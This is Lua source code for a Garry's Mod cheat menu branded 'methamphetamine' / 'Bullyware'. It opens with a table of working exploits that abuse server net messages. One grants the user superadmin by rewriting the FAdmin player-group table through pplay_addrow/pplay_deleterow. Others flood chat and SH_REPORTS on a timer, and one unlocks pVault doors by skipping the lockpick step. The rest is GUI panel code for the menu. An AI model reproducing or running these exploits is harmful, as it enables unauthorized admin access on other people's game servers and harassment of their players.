        timer.Create("METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[1], 0, function()
            net.Start( "steamid2" )
            net.WriteString( "Bullyware :OO" )
            net.SendToServer()
        end)
    end
})

exploits:Add({
    name = "Chat Spammer",
    desc = "This spams \"<your name> is friends with <your message>\" in chat for everyone.",
    args = {
        {type = "text", name = "Message to spam", default = "Bullyware is just built different"},
        {type = "number", name = "Spam delay", default = 0.1, min = 0.1, max = 5},
    },
    requirements = function()
        return methamphetamine.ValidateNetMessage("sendtable")
    end,
    onExecute = function(tExploitData)
        PrintTable(tExploitData)
        if !tExploitData.canExecute then return end
        if !tExploitData.active then
            timer.Remove("METHAMPHETAMINE.EXPLOIT."..tExploitData.name)
            LocalPlayer:ChatPrint("Aborted")
            return
        end
        print("Creating timer: ", "METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[2], 0 )
        timer.Create("METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[2], 0, function()
            for k, v in ipairs( player.GetAll() ) do
                print("sending net")
                local spamStr = {}
                for i = 1, 15 do
                    table.insert( spamStr, tExploitData.args[1] )
                end

                net.Start( "sendtable" )
                net.WriteEntity( v )
                net.WriteTable( spamStr )
                net.SendToServer()

            end
        end)
    end
})

exploits:Add({
    name = "Get Superadmin",
    desc = "This exploit gives you superadmin. You must reconnect for it to take place.",
    args = {},
    toggle = false,
    requirements = function()
        return methamphetamine.ValidateNetMessage("pplay_addrow") and methamphetamine.ValidateNetMessage("pplay_deleterow")
    end,
    onExecute = function(tExploitData)
        PrintTable(tExploitData)
        if !tExploitData.canExecute then return end
        if !tExploitData.active then
            timer.Remove("METHAMPHETAMINE.EXPLOIT."..tExploitData.name)
            LocalPlayer:ChatPrint("Aborted")
            return
        end
        local id = LocalPlayer:SteamID()
        local tbl = {
            name = "FAdmin_PlayerGroup",
            where = {
                "steamid",
                tostring(id),
            },
        }

        net.Start("pplay_deleterow")
        net.WriteTable(tbl)
        net.SendToServer()

        local tbl = {
            tblname = "FAdmin_PlayerGroup",
            tblinfo = {
                tostring(id),
                "superadmin"
            }
        }

        net.Start("pplay_addrow")
        net.WriteTable(tbl)
        net.SendToServer()

    end
})


exploits:Add({
    name = "SH Reports spam",
    desc = "Spams reports, you know how it is.",
    args = {
        {type = "text", name = "Who are you reporting?",default = "The CEO of Bullyware"},
        {type = "text", name = "What is the reason for the report?",default = "Called me gay"},
        {type = "bool", name = "Should spam reports?", default = false},
        {type = "number", name = "Spam rate", default = 0.2, min = 0.1, max = 5},
    },
    toggle = true,
    requirements = function()
        return methamphetamine.ValidateNetMessage("SH_REPORTS.NewReport") 
    end,
    onExecute = function(tExploitData)
        PrintTable(tExploitData)
        if !tExploitData.canExecute then return end
        if !tExploitData.active then
            timer.Remove("METHAMPHETAMINE.EXPLOIT."..tExploitData.name)
            LocalPlayer:ChatPrint("Aborted")
            return
        end
        if tExploitData.args[3] == true then 
            print("Creating timer: ", "METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[4], 0 )
            timer.Create("METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[4], 0, function()
                net.Start("SH_REPORTS.NewReport") 
                net.WriteString(tExploitData.args[1]) 
                net.WriteString("")
                net.WriteString(tExploitData.args[2]) 
                net.WriteUInt(4,8) 
                net.SendToServer()
            end)
        else
            net.Start("SH_REPORTS.NewReport") 
            net.WriteString(tExploitData.args[1]) 
            net.WriteString("")
            net.WriteString(tExploitData.args[2]) 
            net.WriteUInt(4,8) 
            net.SendToServer()
        end
    end
})

local function getClosestPVault()
    local closest
    local pVaults = ents.FindByClass("pvault_door")
    for k,v in ipairs(pVaults) do
        if not closest then closest = v end
        if closest:GetPos():DistToSqr(LocalPlayer:GetPos()) > v:GetPos():DistToSqr(LocalPlayer:GetPos()) then
            closest = v
        end
    end
    return closest
end
exploits:Add({
    name = "Unlock pVault",
    desc = "Look at the vault, execute this and wait a couple of seconds :)",
    args = {},
    toggle = false,
    requirements = function()
        return methamphetamine.ValidateNetMessage("pvault_lockpick_pass") 
    end,
    onExecute = function(tExploitData)
        local vault = getClosestPVault()
        print("vault: ".. tostring(vault) )
        if not IsValid(vault) then return end
        RunConsoleCommand("+use")
        timer.Simple(8,function()
            RunConsoleCommand("-use")
            net.Start("pvault_lockpick_pass")
            net.WriteEntity(vault)
            net.SendToServer()
        end)
    end
})


methamphetamine.exploits = exploits


methamphetamine["default"] = {
    ["title"] = "methamphetamine.solutions",
    ["font"] = "methamphetamine.font",
    ["_font"] = "Raleway", --"Raleway",
    ["tickmat"] = Material("meth/tick.png"),
    ["outlinefont"] = "metamphetamine.font.outline"
}

local mascots = {
    ["zerotwo"] = Material("meth/mascots/zerotwo.png"),
    ["slavcat"] = Material("meth/mascots/bcat.png"),
    ["pepesquat"] = Material("meth/mascots/slavpepe.png"),
    ["obama"] = Material("meth/mascots/obama.png"),
}

-- may need some configuring for your resolution
methamphetamine["mascots"] = {
    ["active"] = "obama",
    ["zerotwo"] = {
        mat = mascots["zerotwo"],
        x = ScrW() - mascots["zerotwo"]:Width() * 0.6,
        y = ScrH() - mascots["zerotwo"]:Height() * 0.6,
        w = mascots["zerotwo"]:Width() * 0.6,
        h = mascots["zerotwo"]:Height() * 0.6,
    },
    ["slavcat"] = {
        mat = mascots["slavcat"],
        x = ScrW() - mascots["slavcat"]:Width() * 1.2,
        y = ScrH() - mascots["slavcat"]:Height() * 1.2,
        w = mascots["slavcat"]:Width() * 1.2,
        h = mascots["slavcat"]:Height() * 1.4,
    },
    ["pepesquat"] = {
        mat = mascots["pepesquat"],
        x = ScrW() - mascots["pepesquat"]:Width() * 1,
        y = ScrH() - mascots["pepesquat"]:Height() * 0.6,
        w = mascots["pepesquat"]:Width() * 1,
        h = mascots["pepesquat"]:Height() * 1,
    },
    ["obama"] = {
        mat = mascots["obama"],
        x = ScrW() - mascots["obama"]:Width() * 0.2,
        y = ScrH() - mascots["obama"]:Height() * 0.2,
        w = mascots["obama"]:Width() * 0.2,
        h = mascots["obama"]:Height() * 0.2,
    }
}

methamphetamine.DebugLogs = {}

methamphetamine.Log = function(text)
    local tbl = {
        text = text,
        time = os.time(),
        id = #methamphetamine.DebugLogs + 1
    }

    table.insert(methamphetamine.DebugLogs, tbl)

    if #methamphetamine.DebugLogs > 200 then
        table.remove(methamphetamine.DebugLogs)
    end

    hook.Run("methamphetamine.log", tbl)
end

hook._add = hook._add or hook.Add

function hook.Add(x, y, z)
    if methamphetamine.Log then
        methamphetamine.Log("Hook Added\n[" .. x .. "] " .. tostring(y))
    end

    return hook._add(x, y, z)
end

surface.CreateFont(methamphetamine.default.font, {
    font = methamphetamine.default._font,
    size = 15,
    weight = 150,
})

local panelMetaTable = FindMetaTable("Panel")

function panelMetaTable:MethToolTip(text)
    self._hasToolTip = true

    self.OnCursorEntered = function(self)
        print("Entered")
        self._tooltip = vgui.Create("DPanel")
        print(self._tooltip)
        local x, y = input.GetCursorPos()
        self._tooltip:SetPos(x + 20, y)
        self._tooltip.isTooltip = true
        self._tooltip:SetSize(1000, 1000)
        self._tooltip:SetKeyboardInputEnabled(true)
        self._tooltip:MakePopup()
        self._tooltip.markup = markup.Parse("<font=" .. methamphetamine.default.font .. "><colour=179,179,179,255>" .. text .. "</colour></font>")

        self._tooltip.Paint = function(pnl, w, h)
            surface.SetDrawColor(methamphetamine.colors.background)
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(methamphetamine.colors.border)
            surface.DrawOutlinedRect(0, 0, w, h)
            pnl.markup:Draw(15, 7, 0, 0)
        end

        self._tooltip.Think = function(pnl)
            if not self:IsHovered() then
                pnl:Remove()
            end
        end

        self._tooltip.PerformLayout = function(pnl, w, h)
            self._tooltip:SetSize(pnl.markup:GetWidth() + 30, pnl.markup:GetHeight() + 15)
        end
    end

    self.OnCursorExited = function(pnl)
        if IsValid(self._tooltip) then
            self._tooltip:Remove()
            print("Removed!")
        end
    end

    self.OnCursorMoved = function(pnl)
        if not IsValid(self._tooltip) then return end
        local x, y = input.GetCursorPos()
        self._tooltip:SetPos(x + 20, y)
    end
end

function panelMetaTable:ConfigUpdate(func)
    local s = debug.getinfo(2).source
    methamphetamine.Log("Use of deprecated function at\n" .. s)
end

function panelMetaTable:Configure(...)
    if not ispanel(self) then
        PrintTable(debug.getinfo(2))
        print([[
        ///////////////////
        // INVALID PANEL //
        ///////////////////
        ]])

        return
    end

    local tbl = {...}

    hook.Add("methamphetamine.configLoaded", self, function(mods)
        if not IsValid(self) then
            hook.Remove("methampheteamine.configLoaded", self)

            return
        end

        local str = "methamphetamine.mods"
        local index = methamphetamine.mods

        for k, v in ipairs(tbl) do
            if not index then
                print("Invalid index!\t" .. str)

                return
            end

            str = str .. "[" .. tostring(v) .. "]"
            index = index[v]
        end

        -- if type(index) == "boolean" then
        --     if self.SetState then
        --         self:SetState(index)
        --     end
        -- elseif type(index) == "string" then
        --     if self.
        -- end
        if self.SetState then
            self:SetState(index or false)
        elseif self.SetValue then
            self:SetValue(index)
        elseif self.SetColor then
            if istable(index) then
                print("SS")
                PrintTable(index)
                print("ZZ")
                self:SetColor(Color(index.r, index.g, index.b, index.a))
            else
                methamphetamine.Log("[ERROR] SETTING COLOR NOT TABLE: " .. tostring(index))
            end
        end
    end)
end

hook.Remove("methamphetamine.configLoaded", "Print", function(mods)
    timer.Simple(3, function()
        PrintTable(mods)
    end)
end)

local PANEL = {}
AccessorFunc(PANEL, "m_max", "Max")
AccessorFunc(PANEL, "m_min", "Min")
AccessorFunc(PANEL, "m_sliderHeight", "Height")

function PANEL:Init()
    self.floor = true
    self:SetText("")
    self:SetMin(0)
    self:SetMax(180)
    self:SetHeight(2.5)
    --self:SetColor(methamphetamine.colors.border)
    self.fraction = 0
    self.grip = vgui.Create("DButton", self)
    self.grip:SetText("")
    self.grip.xOffset = 0
    self.grip.startSize = self:GetHeight() * 4
    self.grip.size = self.grip.startSize
    self.grip.outlineSize = self.grip.startSize

    self.grip.Paint = function(pnl, w, h)
        surface.SetDrawColor(methamphetamine.colors.grip)
        surface.DrawRect(2, 2, w - 4, h - 4)
    end

    self.grip.OnMousePressed = function(pnl)
        pnl.Depressed = true
        pnl:MouseCapture(true)
    end

    self.grip.OnMouseReleased = function(pnl)
        pnl.Depressed = nil
        pnl:MouseCapture(false)
    end

    self.grip.OnCursorMoved = function(pnl, x, y)
        if (not pnl.Depressed) then return end
        local x, y = pnl:LocalToScreen(x, y)
        x, y = self:ScreenToLocal(x, y)
        local w = self:GetWide()
        local newX = math.Clamp(x / w, 0, 1)
        self.fraction = newX
        self:OnValueChanged(self.fraction)
        self:InvalidateLayout()
    end

    self.grip:SetWide(self.grip.startSize * 2)
end

function PANEL:OnMousePressed()
    local x, y = self:CursorPos()
    local w = self:GetWide() + (self:GetHeight() * 2)
    local newX = math.Clamp(x / w, 0, 1)
    self.fraction = newX
    self:OnValueChanged(self.fraction)
    self:InvalidateLayout()
end

function PANEL:SetValue(x)
    self.fraction = math.Clamp(x / self:GetMax(), 0, 1)
end

function PANEL:SetRound(bool)
    self.floor = tobool(bool)
end

function PANEL:OnValueChanged(fraction, val)
end

function PANEL:Paint(w, h)
    local height = self:GetHeight()
    local y = h / 2 - height / 2
    surface.SetDrawColor(methamphetamine.colors.buttonidle)
    surface.DrawRect(0, 0, w, h)
    local width = self.fraction * w
    draw.SimpleText(self.floor and math.floor(self.fraction * self:GetMax()) or string.format("%.3f", self.fraction * self:GetMax()), methamphetamine.default.font, w / 2, h / 2, methamphetamine.colors.text, 1, 1)
end

function PANEL:PerformLayout(w, h)
    self.grip:SetTall(h, h)
    self.grip:SetPos(self.fraction * (w - self.grip.size * 2))
end

vgui.Register("methamphetamine.slider", PANEL, "DButton")
local PANEL = {}

function PANEL:Init()
    local cx, cy = input.GetCursorPos()
    self:SetText("Default Text")
    self:SetFont(methamphetamine.default.font)
    self:SetTextColor(methamphetamine.colors.text)
    self._menu = vgui.Create("methamphetamine.panel")

    -- self._menu.Think = function(pnl)
    --     if not (methamphetamine.master:IsVisible()) then
    --         pnl:SetVisible(false)
    --     end
    -- end
    self._menu.OnFocusChanged = function(pnl, gained)
        if gained then return end

        timer.Simple(0, function()
            local panel = vgui.GetKeyboardFocus()
            if not IsValid(panel) then return end
            if panel.isTooltip or panel == pnl or self.boolops[panel] or panel == self._menu then return end
            pnl:SetVisible(false)
        end)
    end

    self._menu:SetPos(cx + 1, cy + 1)
    self._menu:SetSize(240, 225)
    self._menu:MakePopup()
    self._menu:DockPadding(8, 8, 8, 8)
    self._menu:SetVisible(false)
    self.ops = {}
    self.oplen = 0
    self.boolops = {}
end

function PANEL:SetLabel(text)
    self:SetText(text)
    self:SetFont(methamphetamine.default.font)
    self:SizeToContentsX(10)
end

function PANEL:DoClick()
    if IsValid(self._menu) then
        self._menu:SetVisible(not self._menu:IsVisible())
        local cx, cy = input.GetCursorPos()
        self._menu:SetPos(cx + 1, cy + 1)
        self._menu:MakePopup()

        return
    end
end

function PANEL:SetPanelWidth(iWidth)
    self._menu:SetWide(iWidth)
end

function PANEL:AddOption(name, data)
    self.ops[name] = self._menu:Add("Panel")
    self.ops[name]:Dock(TOP)
    self.ops[name]:DockMargin(0, 1, 0, 1)
    self.ops[name]:SetTall(20)
    self.ops[name].content = self.ops[name]:Add(data.panel)
    self.boolops[self.ops[name].content] = true
    self.boolops[self.ops[name]] = true

    if data.panel == "methamphetamine.checkbox" then
        self.ops[name].content:Dock(LEFT)
        self.ops[name].content:SetWide(20)
        self.ops[name].content:SetLabel(data.text)
        self.ops[name].content.OnToggle = data.OnToggle or function() end
    end

    if data.panel == "methamphetamine.slider" then
        self.ops[name].content:Dock(LEFT)
        self.ops[name].content:SetWide(100)
        self.ops[name].content:SetMax(data.max)
        self.ops[name].content.OnValueChanged = data.OnValueChanged or function() end
    end

    if data.panel == "methamphetamine.binder" then
        self.ops[name].content:Dock(LEFT)
        self.ops[name].content:SetWide(80)
        self.ops[name].content.OnChange = data.OnChange or function() end
    end

    if data.panel ~= "methamphetamine.checkbox" then
        self.ops[name].label = self.ops[name]:Add("DLabel")
        self.ops[name].label:Dock(LEFT)
        self.ops[name].label:DockMargin(4, 0, 0, 0)
        self.ops[name].label:SetText(data.text)
        self.ops[name].label:SetFont(methamphetamine.default.font)
        self.ops[name].label:SetTextColor(methamphetamine.colors.text)
        self.ops[name].label:SizeToContents()
    end

    if data.tooltip then
        self.ops[name].content:MethToolTip(data.tooltip)
    end

    if data.Configure then
        self.ops[name].content:Configure(unpack(data.Configure))
    end

    --print("\n\n\n\n\n".. tostring(data.ConfigUpdate) .. "\n\n\n\n\n")
    self.ops[name].content.ConfigUpdate = data.ConfigUpdate
    self.oplen = self.oplen + 1
    self._menu:SetTall(math.max(self.oplen * 22 + 16, 20))
end

function PANEL:Paint(w, h)
    surface.SetDrawColor(self:IsHovered() and methamphetamine.colors.hovered or methamphetamine.colors.border)
    surface.DrawRect(0, 0, w, h)
end

vgui.Register("methamphetamine.miscdrop", PANEL, "DButton")
local PANEL = {}
local downarrowmat = Material("meth/down-arrow.png")

function PANEL:Init()
    self.m_HideDiamond = false
    self:SetFont(methamphetamine.default.font)
    self:SetTextColor(color_transparent)
    self.m_DropdownXPos = 0
    self.m_DropdownYPos = 0
    self.m_Choices = {}
end

function PANEL:Paint(w, h)
    surface.SetDrawColor(self:IsHovered() and methamphetamine.colors.activebutton or methamphetamine.colors.buttonidle)
    surface.DrawRect(0, 0, w, h)

    if not self.m_HideDiamond then
        surface.SetDrawColor(methamphetamine.colors.activebutton)
        surface.DrawRect(w - h, 0, h, h)
        surface.SetDrawColor(color_white)
        surface.SetMaterial(downarrowmat)
        surface.DrawTexturedRect(w - h + 3, 3, h - 6, h - 6)
    end

    draw.SimpleText(self.value and self.value.name or "NO VALUE", methamphetamine.default.font, 6, h / 2, methamphetamine.colors.text, 0, 1)
end

function PANEL:PerformLayout(w, h)
    local x, y = self:LocalToScreen()
    self.m_DropdownXPos = x
    self.m_DropdownYPos = y + h
end

function PANEL:AddChoice(name, onclick)
    self.m_Choices[#self.m_Choices + 1] = {}
    local choice = self.m_Choices[#self.m_Choices]
    choice.name = name
    choice.id = #self.m_Choices
    choice.onclick = onclick
    self:SetValue(1)
end

function PANEL:SetValue(int)
    methamphetamine.Log("Setting value using var " .. tostring(int))
    print("AYO")

    if type(int) == "string" then
        for k, v in ipairs(self.m_Choices) do
            if v.name == int then
                int = v.id
                print(int, v.id)
                break
            end
        end
    end

    if not self.m_Choices[int] then
        print("FAIL")

        return methamphetamine.Log("Attempting to index nil value ")
    end

    print("SUCCESS " .. self.m_Choices[int].name)
    self:SetText(self.m_Choices[int].name)
    self.value = self.m_Choices[int]
end

function PANEL:GetValue()
    return self.value.id
end

function PANEL:DoClick()
    if IsValid(self.DropDownPanel) then
        self.DropDownPanel:Remove()

        return
    end

    self.DropDownPanel = vgui.Create("methamphetamine.panel")
    self.DropDownPanel:SetSize(self:GetWide(), 30)
    self.DropDownPanel:SetPos(self.m_DropdownXPos, self.m_DropdownYPos)
    self.DropDownPanel:MakePopup()

    self.DropDownPanel.OnFocusChanged = function(pnl, gained)
        if gained then return end

        timer.Simple(0, function()
            local panel = vgui.GetKeyboardFocus()
            if not IsValid(panel) then return end
            if panel.isTooltip or panel == pnl or panel.isPreview then return end
            pnl:Remove()
        end)
    end

    self.DropDownPanel.Choices = {}

    for k, v in ipairs(self.m_Choices) do
        self.DropDownPanel.Choices[#self.DropDownPanel.Choices + 1] = self.DropDownPanel:Add("DButton")
        local choice = self.DropDownPanel.Choices[#self.DropDownPanel.Choices]
        choice:Dock(TOP)
        choice.id = v.id
        choice:SetTall(20)

        choice.DoClick = function(pnl)
            v.onclick(choice, v.id, v.name)
            self:SetValue(pnl.id)
            self.DropDownPanel:Remove()
        end

        choice:SetText("")

        choice.Paint = function(pnl, w, h)
            surface.SetDrawColor(tonumber(self.value.id) == tonumber(pnl.id) and methamphetamine.colors.active or pnl:IsHovered() and methamphetamine.colors.hovered or color_transparent)
            surface.DrawRect(0, 0, w, h)
            draw.SimpleText(v.name, methamphetamine.default.font, 6, h / 2, methamphetamine.colors.text, 0, 1)
        end
    end

    self.DropDownPanel:SetTall(#self.m_Choices * 20)
    --print()
    --PrintTable( self.m_Choices )
    --print()
    --PrintTable( self.value )
end

function PANEL:HideDiamond(bool)
    self.m_HideDiamond = bool
end

vgui.Register("methamphetamine.dropdown", PANEL, "DButton")
local PANEL = {}

function PANEL:Init()
end

vgui.Register("methamphetamine.list", PANEL, "EditablePanel")
local PANEL = {}

function PANEL:Init()
    self:SetFont(methamphetamine.default.font)
    self:SetTextColor(methamphetamine.colors.text)
    -- self:SetMouseInputEnabled( true ) 
    -- self:SetKeyboardInputEnabled( true )
end

-- function PANEL:OnMousePressed()
--     self:MoveToFront()
--     self:RequestFocus()
-- end
function PANEL:Paint(w, h)
    surface.SetDrawColor(methamphetamine.colors.buttonidle)
    surface.DrawRect(0, 0, w, h)
    self:DrawTextEntryText(methamphetamine.colors.text, methamphetamine.colors.border, methamphetamine.colors.border)
end

vgui.Register("methamphetamine.search", PANEL, "DTextEntry")
local PANEL = {}
AccessorFunc(PANEL, "m_iSelectedNumber", "SelectedNumber")
Derma_Install_Convar_Functions(PANEL)

function PANEL:Init()
    self:SetSelectedNumber(0)
    self:SetSize(60, 30)
    self:SetTextColor(methamphetamine.colors.text)
    self:SetFont(methamphetamine.default.font)
end

function PANEL:UpdateText()
    local str = input.GetKeyName(self:GetSelectedNumber() or -1)

    if (not str) then
        str = "None"
    end

    str = language.GetPhrase(str)
    self:SetText(string.upper(str))
end

function PANEL:DoClick()
    self:SetText("Press a key")
    input.StartKeyTrapping()
    self.Trapping = true
end

function PANEL:DoRightClick()
    self:SetText("Always")
    self:SetValue(0)
end

function PANEL:SetSelectedNumber(iNum)
    self.m_iSelectedNumber = iNum
    self:ConVarChanged(iNum)
    self:UpdateText()
    self:OnChange(iNum)
end

function PANEL:Think()
    if (input.IsKeyTrapping() and self.Trapping) then
        local code = input.CheckKeyTrapping()

        if (code) then
            if (code == KEY_ESCAPE) then
                self:SetValue(0)
                self:SetText("Always")
            else
                self:SetValue(code)
            end

            self.Trapping = false
        end
    end

    self:ConVarNumberThink()
end

function PANEL:SetValue(iNumValue)
    self:SetSelectedNumber(iNumValue)
end

function PANEL:GetValue()
    return self:GetSelectedNumber()
end

function PANEL:OnChange()
end

function PANEL:Paint(w, h)
    surface.SetDrawColor((self:IsHovered() and methamphetamine.colors.activetoggle) or methamphetamine.colors.buttonidle)
    surface.DrawRect(0, 0, w, h)
end

vgui.Register("methamphetamine.binder", PANEL, "DButton")
local PANEL = {}

function PANEL:Init()
end

function PANEL:Paint(w, h)
    surface.SetDrawColor(methamphetamine.colors.background)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(methamphetamine.colors.border)
    surface.DrawOutlinedRect(0, 0, w, h)
end

vgui.Register("methamphetamine.panel", PANEL)
local PANEL = {}

function PANEL:Init()
    self.state = false
    self:SetText("")
    self.mat = Material("meth/tick.png")
    self:NoClipping(true)
end

function PANEL:SetState(newstate)
    self.state = newstate or self.state
end

function PANEL:SetLabel(text)
    self.text = text
end

function PANEL:OnToggle()
end

function PANEL:DoClick()
    self.state = not self.state
    self:OnToggle(self.state)
end

function PANEL:Paint(w, h)
    surface.SetDrawColor(self:IsHovered() and methamphetamine.colors.activetoggle or methamphetamine.colors.buttonidle)
    surface.DrawRect(0, 0, w, h)

    if self.state then
        surface.SetMaterial(self.mat)
        surface.SetDrawColor(methamphetamine.colors.activebutton)
        surface.DrawTexturedRect(3, 3, w - 6, h - 6)
    end

    draw.SimpleText(self.text or "Enabled", methamphetamine.default.font, w + 5, h / 2, methamphetamine.colors.text, 0, 1)
end

vgui.Register("methamphetamine.checkbox", PANEL, "DButton")
local PANEL = {}

function PANEL:Init()
    self.mods = self:Add("DPanel")
    self.mods:Dock(TOP)
    self.mods:SetTall(20)
    self.mods:DockMargin(0, 0, 0, 0)

    self.mods.Paint = function(pnl, w, h)
        surface.SetDrawColor(methamphetamine.colors.border)
        surface.DrawRect(0, h - 2, w, 2)
    end

    self.mods:DockPadding(2, 0, 0, 0)
    self.pages = {}
end

PANEL.Paint = nil

function PANEL:SetActive(i)
    local btn = self.pages[i]

    if IsValid(self.pages.active) then
        self.pages.active:SetVisible(false)
    end

    btn.panel:SetVisible(true)
    self.pages.active = btn.panel
end

function PANEL:AddCheat(name, panel)
    local i = #self.pages + 1
    self.pages[i] = self.mods:Add("DButton")
    local btn = self.pages[i]
    btn:Dock(LEFT)
    btn:DockMargin(1, 3, 1, 2)
    btn:SetText("")
    surface.SetFont(methamphetamine.default.font)
    local wide, tall = surface.GetTextSize(name)
    btn:SetWide(wide + 8)

    btn.Paint = function(pnl, w, h)
        surface.SetDrawColor((pnl:IsHovered() or pnl.panel == self.pages.active) and methamphetamine.colors.activebutton or methamphetamine.colors.border)
        surface.DrawRect(0, 0, w, h)
        draw.SimpleText(name, methamphetamine.default.font, w / 2, h / 2, methamphetamine.colors.disabledtext, 1, 1)
    end

    btn.DoClick = function(pnl)
        if self.pages.active == pnl.panel then return end
        btn.panel:SetVisible(true)

        if IsValid(self.pages.active) then
            self.pages.active:SetVisible(false)
        end

        self.pages.active = btn.panel
    end

    btn.panel = self:Add(panel or "DButton")
    btn.panel:Dock(FILL)
    btn.panel:DockMargin(5, 5, 5, 5)
    btn.panel:SetVisible(false)

    return self.pages[i]
end

vgui.Register("methamphetamine.submods", PANEL)
local PANEL = {}
AccessorFunc(PANEL, "mResizeable", "Resizeable", FORCE_BOOL)
AccessorFunc(PANEL, "mShowCloseButton", "ShowCloseButton", FORCE_BOOL)

function PANEL:Init()
    self.bar = self:Add("DButton")
    self.bar:Dock(TOP)
    self.bar:SetTall(20)

    self.bar.Paint = function(pnl, w, h)
        surface.SetDrawColor(methamphetamine.colors.border)
        surface.DrawRect(0, 0, w, h)
        draw.SimpleText(self.title or methamphetamine.default.title, methamphetamine.default.font, w / 2, h / 2, methamphetamine.colors.disabledtext, 1, 1)
    end

    self.bar:SetText("")
    local oldpress = self.OnMousePressed

    self.OnMousePressed = function(pnl, code)
        self.Dragging = {gui.MouseX() - self.x, gui.MouseY() - self.y}

        self:MouseCapture(true)
    end

    self.OnMouseReleased = function(pnl, k)
        pnl.Dragging = nil
        pnl.Sizing = nil
        pnl:MouseCapture(false)
    end

    self.Think = function(pnl)
        local mousex = math.Clamp(gui.MouseX(), 1, ScrW() - 1)
        local mousey = math.Clamp(gui.MouseY(), 1, ScrH() - 1)

        if (pnl.Dragging) then
            local x = mousex - pnl.Dragging[1]
            local y = mousey - pnl.Dragging[2]
            -- Lock to screen bounds if screenlock is enabled
            --if ( self:GetScreenLock() ) then
            x = math.Clamp(x, 0, ScrW() - self:GetWide())
            y = math.Clamp(y, 0, ScrH() - self:GetTall())
            --end
            self:SetPos(x, y)
        end
    end

    self.bar:SetCursor("arrow")
    self.bar.OnMousePressed = self.OnMousePressed
    self.bar.OnMouseReleased = self.OnMouseReleased
    self.bar.Think = self.Think
    self:SetCursor("arrow")
    self.diamond = self:Add("DButton")
    self.diamond:SetSize(20, 20)
    self.diamond.mat = Material("meth/drag.png")
    self.diamond:SetText("")

    self.diamond.Paint = function(pnl, w, h)
        surface.SetDrawColor(methamphetamine.colors.border)
        surface.SetMaterial(pnl.mat)
        surface.DrawTexturedRect(0, 0, w, h)
    end

    self.diamond:SetCursor("arrow")
    local oldpress_ = self.diamond.OnMousePressed

    self.diamond.OnMousePressed = function(pnl, code)
        pnl.Sizing = {gui.MouseX() - pnl.x - 20, gui.MouseY() - pnl.y - 20}

        pnl:MouseCapture(true)
        oldpress_(pnl, code)
    end

    self.diamond.OnMouseReleased = function(pnl, k)
        pnl.Dragging = nil
        pnl.Sizing = nil
        pnl:MouseCapture(false)
    end

    self.diamond.m_iMinHeight = 80
    self.diamond.m_iMinWidth = 80

    self.diamond.Think = function(pnl)
        local mousex = math.Clamp(gui.MouseX(), 1, ScrW() - 1)
        local mousey = math.Clamp(gui.MouseY(), 1, ScrH() - 1)

        if pnl.Sizing then
            local x = mousex - pnl.Sizing[1]
            local y = mousey - pnl.Sizing[2]
            local px, py = pnl:GetPos()

            if (x < pnl.m_iMinWidth) then
                x = pnl.m_iMinWidth
            elseif (x > ScrW() - 10 and true) then
                x = ScrW() - px
            end

            if (y < pnl.m_iMinHeight) then
                y = pnl.m_iMinHeight
            elseif (y > ScrH() - 10 and true) then
                y = ScrH() - py
            end

            self:SetSize(x, y)
        end
    end
end

function PANEL:Paint(w, h)
    surface.SetDrawColor(methamphetamine.colors.background)
    surface.DrawRect(0, 0, w, h)
    surface.SetDrawColor(methamphetamine.colors.border)
    surface.DrawOutlinedRect(0, 0, w, h)
end

function PANEL:SetTitle(text)
    self.title = text
end

function PANEL:PerformLayout(w, h)
    if not self:GetResizeable() then
        self.diamond:Remove()
    end

    if IsValid(self.diamond) then
        self.diamond:SetPos(w - 20, h - 20)
    end
end

vgui.Register("methamphetamine.frame", PANEL, "EditablePanel")
local PANEL = {}

function PANEL:Init()
    self.lastopen = 0
    self:MakePopup()
    self.menubar = self:Add("DPanel")
    self.menubar:Dock(TOP)
    self.menubar:SetTall(20)

    self.menubar.Paint = function(pnl, w, h)
        surface.SetDrawColor(methamphetamine.colors.menubar)
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(methamphetamine.colors.border)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    self.menubar.version = self.menubar:Add("Panel")
    self.menubar.version:Dock(LEFT)
    self.menubar.version:SetWide(225)

    self.menubar.version.Paint = function(pnl, w, h)
        surface.SetDrawColor(methamphetamine.colors.border)
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    self.menubar.version = self.menubar.version:Add("DLabel")
    self.menubar.version:SetFont(methamphetamine.default.font)
    self.menubar.version:SetText("Bullyware[WIP] ")
    self.menubar.version:SetTextColor(methamphetamine.colors.text)
    self.menubar.version:Dock(LEFT)
    self.menubar.version:DockMargin(5, 0, 0, 0)
    self.menubar.version:SizeToContents()
    self.menubar.windows = self.menubar:Add("DButton")
    self.menubar.windows:Dock(LEFT)
    self.menubar.windows:SetFont(methamphetamine.default.font)
    self.menubar.windows:SetText("Windows")
    self.menubar.windows:SetTextColor(methamphetamine.colors.text)
    self.menubar.windows:SizeToContentsX(10)
    local opaque = Color(255, 255, 255, 0)

    self.menubar.windows.Paint = function(pnl, w, h)
        surface.SetDrawColor((pnl:IsHovered() or pnl.dropdown:IsVisible()) and methamphetamine.colors.activebutton or opaque)
        surface.DrawRect(0, 0, w, h)
    end

    self.menubar.windows.dropdown = self:Add("methamphetamine.panel")
    local dropdown = self.menubar.windows.dropdown
    dropdown:SetWide(130)

    self.menubar.windows.DoClick = function(pnl)
        pnl.dropdown:SetVisible(not pnl.dropdown:IsVisible())
    end

    local dropdown = methamphetamine.windows

    for k, v in ipairs(dropdown) do
        local dd = self.menubar.windows.dropdown:Add("DButton")
        dd:Dock(TOP)
        dd:SetTall(15)
        dd:DockMargin(4, 0, 4, 0)
        dd:SetText("")

        dd.Paint = function(pnl, w, h)
            surface.SetDrawColor(pnl:IsHovered() and methamphetamine.colors.hovered or methamphetamine.colors.background)
            surface.DrawRect(0, 0, w, h)
            draw.SimpleText(v.name, methamphetamine.default.font, 8, h / 2, methamphetamine.colors.disabledtext, 0, 1)

            if v.isToggled then
                surface.SetDrawColor(methamphetamine.colors.activebutton)
                surface.SetMaterial(methamphetamine.default.tickmat)
                surface.DrawTexturedRect(w - h, 0, h, h)
            end
        end

        dd.DoClick = function(pnl)
            v.isToggled = not v.isToggled
